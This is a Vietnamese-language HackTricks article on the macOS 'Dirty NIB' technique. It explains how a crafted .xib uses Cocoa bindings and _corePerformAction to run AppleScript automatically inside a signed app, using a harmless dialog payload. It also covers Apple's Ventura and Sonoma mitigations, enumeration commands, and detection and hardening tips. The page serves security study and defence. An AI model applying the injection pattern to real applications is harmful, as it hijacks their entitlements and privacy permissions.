# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB là kỹ thuật lạm dụng các tệp Interface Builder (.xib/.nib) bên trong bundle ứng dụng macOS đã ký để thực thi logic do kẻ tấn công kiểm soát trong tiến trình mục tiêu, qua đó kế thừa các entitlements và quyền TCC của tiến trình đó. Kỹ thuật này được xpn (MDSec) ghi lại lần đầu, sau đó được Sector7 khái quát hóa và mở rộng đáng kể; Sector7 cũng đề cập đến các biện pháp giảm thiểu của Apple trong macOS 13 Ventura và macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Để tìm hiểu bối cảnh và chuyên sâu hơn, hãy xem các tài liệu tham khảo ở cuối bài.

> Tóm tắt
> • Trước macOS 13 Ventura: thay thế MainMenu.nib của bundle (hoặc nib khác được tải khi khởi động) có thể thực hiện process injection một cách đáng tin cậy và thường dẫn đến privilege escalation.  
> • Từ macOS 13 (Ventura), và được cải thiện trong macOS 14 (Sonoma): xác minh sâu khi khởi chạy lần đầu, bảo vệ bundle, Launch Constraints và quyền TCC “App Management” mới phần lớn ngăn các ứng dụng không liên quan sửa đổi nib sau khi ứng dụng đã khởi chạy. Tấn công vẫn có thể khả thi trong một số trường hợp đặc biệt (ví dụ: công cụ của cùng nhà phát triển sửa đổi ứng dụng của chính họ, hoặc người dùng cấp quyền App Management/Full Disk Access cho terminal).

## Tệp NIB/XIB là gì

Tệp nib (viết tắt của NeXT Interface Builder) là các đồ thị đối tượng UI được tuần tự hóa, dùng trong các ứng dụng AppKit. Xcode hiện đại lưu các tệp .xib có thể chỉnh sửa dưới dạng XML, sau đó biên dịch thành .nib khi build. Một ứng dụng điển hình tải UI chính thông qua `NSApplicationMain()`, hàm này đọc khóa `NSMainNibFile` từ Info.plist của ứng dụng và khởi tạo đồ thị đối tượng lúc chạy.

Các điểm chính tạo điều kiện cho cuộc tấn công:
- Quá trình tải NIB khởi tạo các lớp Objective-C tùy ý mà không yêu cầu chúng tuân thủ NSSecureCoding (trình tải nib của Apple sẽ dùng `init`/`initWithFrame:` nếu không có `initWithCoder:`).
- Có thể lạm dụng Cocoa Bindings để gọi các phương thức khi nib được khởi tạo, bao gồm cả các chuỗi gọi không cần người dùng tương tác.


## Quy trình Dirty NIB injection (góc nhìn của kẻ tấn công)

Quy trình kinh điển trước Ventura:
1) Tạo một .xib độc hại
- Thêm một đối tượng `NSAppleScript` (hoặc các lớp “gadget” khác như `NSTask`).
- Thêm một `NSTextField` có title chứa payload (ví dụ: AppleScript hoặc tham số lệnh).
- Thêm một hoặc nhiều đối tượng `NSMenuItem`, liên kết chúng qua bindings để gọi phương thức trên đối tượng mục tiêu.

2) Tự động kích hoạt mà không cần nhấp chuột
- Dùng bindings để đặt target/selector của một mục menu, sau đó gọi phương thức riêng `_corePerformAction` để hành động tự động chạy khi nib được tải. Nhờ vậy, người dùng không cần nhấp vào nút.

Ví dụ tối giản về chuỗi tự động kích hoạt bên trong .xib (đã lược bớt cho dễ hiểu):
```xml
<objects>
  <customObject id="A1" customClass="NSAppleScript"/>
  <textField id="A2" title="display dialog \"PWND\""/>
  <!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
  <menuItem id="C1">
    <connections>
      <binding name="target" destination="A1"/>
      <binding name="selector" keyPath="initWithSource:"/>
      <binding name="Argument" destination="A2" keyPath="title"/>
    </connections>
  </menuItem>
  <!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
  <menuItem id="C2">
    <connections>
      <binding name="target" destination="A1"/>
      <binding name="selector" keyPath="executeAndReturnError:"/>
    </connections>
  </menuItem>
  <!-- Triggers that auto‑press the above menu items at load time -->
  <menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
  <menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Điều này cho phép thực thi AppleScript tùy ý trong tiến trình mục tiêu khi nib được tải.<sup>[[1]](#references)</sup> Các chuỗi khai thác nâng cao có thể:
- Khởi tạo các lớp AppKit tùy ý (ví dụ: `NSTask`) và gọi các phương thức không có tham số như `-launch`.
- Gọi các selector tùy ý với đối số object thông qua thủ thuật binding ở trên.
- Tải AppleScriptObjC.framework để kết nối với Objective‑C, thậm chí gọi một số C API được chọn.
- Trên các hệ thống cũ vẫn có Python.framework, kết nối với Python rồi dùng `ctypes` để gọi các hàm C tùy ý (nghiên cứu của Sector7).<sup>[[2]](#references)</sup>

3) Thay nib của ứng dụng
- Sao chép target.app đến một vị trí có thể ghi, thay thế, chẳng hạn, `Contents/Resources/MainMenu.nib` bằng nib độc hại rồi chạy target.app. Trước Ventura, sau lần đánh giá Gatekeeper đầu tiên, các lần khởi chạy tiếp theo chỉ thực hiện kiểm tra chữ ký sơ lược, nên các tài nguyên không thực thi (như .nib) không được xác thực lại.

Ví dụ payload AppleScript để kiểm tra hiển thị:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```


## Các biện pháp bảo vệ hiện đại của macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple đã giới thiệu một số biện pháp giảm thiểu mang tính hệ thống, giúp giảm đáng kể tính khả thi của Dirty NIB trên macOS hiện đại:<sup>[[2]](#references)</sup>
- Xác minh sâu lần chạy đầu tiên và bảo vệ bundle (macOS 13 Ventura)
  - Trong lần chạy đầu tiên của bất kỳ ứng dụng nào (có hoặc không bị quarantine), hệ thống kiểm tra chữ ký sâu trên tất cả tài nguyên của bundle. Sau đó, bundle được bảo vệ: chỉ các ứng dụng từ cùng nhà phát triển (hoặc được ứng dụng cho phép rõ ràng) mới có thể sửa nội dung của nó. Các ứng dụng khác cần quyền TCC “App Management” mới để ghi vào bundle của ứng dụng khác.
- Launch Constraints (macOS 13 Ventura)
  - Không thể sao chép các ứng dụng đi kèm với hệ thống/Apple sang vị trí khác rồi khởi chạy; điều này vô hiệu hóa cách làm “sao chép vào /tmp, vá, chạy” đối với các ứng dụng OS.
- Các cải tiến trong macOS 14 Sonoma
  - Apple tăng cường bảo vệ App Management và khắc phục các lỗ hổng bypass đã biết (ví dụ: CVE‑2023‑40450) được Sector7 ghi nhận. Python.framework đã bị loại bỏ trước đó (macOS 12.3), phá vỡ một số chuỗi leo thang đặc quyền.
- Các thay đổi của Gatekeeper/Quarantine
  - Để tìm hiểu thêm về Gatekeeper, provenance và những thay đổi trong quá trình đánh giá đã ảnh hưởng đến kỹ thuật này, xem trang được tham chiếu bên dưới.

> Ý nghĩa thực tế
> • Trên Ventura trở lên, nhìn chung bạn không thể sửa đổi tệp .nib của ứng dụng bên thứ ba, trừ khi tiến trình của bạn có quyền App Management hoặc được ký bằng cùng Team ID với ứng dụng mục tiêu (ví dụ: công cụ dành cho nhà phát triển).  
> • Cấp quyền App Management hoặc Full Disk Access cho shell/terminal về cơ bản sẽ mở lại bề mặt tấn công này đối với mọi thứ có thể thực thi mã trong ngữ cảnh của terminal đó.


### Xử lý Launch Constraints

Launch Constraints chặn việc chạy nhiều ứng dụng Apple từ các vị trí không mặc định, bắt đầu từ Ventura. Nếu bạn dựa vào các quy trình trước Ventura như sao chép ứng dụng Apple vào thư mục tạm, sửa đổi `MainMenu.nib` rồi khởi chạy ứng dụng đó, dự kiến cách này sẽ thất bại trên phiên bản >= 13.0.


## Liệt kê các mục tiêu và nib (hữu ích cho nghiên cứu / hệ thống cũ)

- Tìm các ứng dụng có giao diện người dùng dựa trên nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
  'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
   then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Tìm các tài nguyên nib tiềm năng bên trong một bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Xác thực chữ ký mã một cách kỹ lưỡng (sẽ thất bại nếu bạn đã can thiệp vào tài nguyên mà không ký lại):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```

> Lưu ý: Trên macOS hiện đại, bạn cũng sẽ bị bundle protection/TCC chặn khi cố ghi vào bundle của ứng dụng khác mà không có quyền phù hợp.


## Mẹo phát hiện và DFIR

- Giám sát tính toàn vẹn tệp của tài nguyên trong bundle
  - Theo dõi các thay đổi mtime/ctime đối với `Contents/Resources/*.nib` và các tài nguyên không thực thi khác trong ứng dụng đã cài đặt.
- Unified logs và hành vi tiến trình
  - Theo dõi việc thực thi AppleScript bất ngờ bên trong các ứng dụng GUI và các tiến trình tải AppleScriptObjC hoặc Python.framework. Ví dụ:
    ```bash
    log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
    ```
- Đánh giá chủ động
  - Định kỳ chạy `codesign --verify --deep` trên các ứng dụng quan trọng để đảm bảo tài nguyên vẫn nguyên vẹn.
- Bối cảnh quyền hạn
  - Kiểm tra những ai/cái gì có TCC “App Management” hoặc Full Disk Access (đặc biệt là terminal và agent quản lý). Gỡ các quyền này khỏi shell đa dụng để ngăn việc bật lại hành vi giả mạo kiểu Dirty NIB một cách dễ dàng.


## Tăng cường phòng thủ (nhà phát triển và người phòng thủ)

- Ưu tiên UI được tạo theo cách lập trình hoặc giới hạn những gì được khởi tạo từ nib. Tránh đưa các class mạnh (ví dụ: `NSTask`) vào đồ thị nib và tránh các binding gián tiếp gọi selector trên những object tùy ý.
- Áp dụng hardened runtime với Library Validation (đã là tiêu chuẩn cho các ứng dụng hiện đại). Dù cách này không tự ngăn được việc chèn nib, nó chặn việc tải mã native dễ dàng và buộc kẻ tấn công phải dùng payload chỉ chạy bằng script.
- Không yêu cầu hoặc phụ thuộc vào quyền App Management rộng trong các công cụ đa dụng. Nếu MDM cần App Management, hãy tách biệt ngữ cảnh đó khỏi các shell do người dùng điều khiển.
- Thường xuyên xác minh tính toàn vẹn của app bundle và đảm bảo cơ chế cập nhật có thể tự khôi phục tài nguyên trong bundle.


## Nội dung liên quan trong HackTricks

Tìm hiểu thêm về Gatekeeper, quarantine và các thay đổi về provenance ảnh hưởng đến kỹ thuật này:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (bài viết gốc với ví dụ về Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Đưa process injection vào tầm nhìn: khai thác mọi ứng dụng macOS bằng nib file (ngày 5 tháng 4 năm 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
{{#include ../../../banners/hacktricks-training.md}}
